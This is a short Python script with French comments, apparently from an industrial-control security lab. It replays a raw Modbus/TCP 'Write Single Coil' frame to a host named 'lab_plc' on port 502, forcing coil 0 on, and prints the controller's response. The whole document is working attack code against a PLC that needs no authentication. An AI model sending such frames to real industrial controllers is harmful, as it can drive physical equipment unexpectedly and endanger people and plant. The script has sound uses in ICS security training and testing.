import socket
import time

# Trame brute : Write Single Coil (05) sur Adresse 0, Valeur ON (FF00)
# Les premiers octets sont l'ID de transaction (aléatoire ici 0x1234)
payload = b'\x12\x34\x00\x00\x00\x06\x01\x05\x00\x00\xFF\x00'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("lab_plc", 502))

print("Envoi de la trame enregistrée (Replay)...")
s.send(payload)
response = s.recv(1024)
print(f"Réponse de l'automate : {response}")
s.close()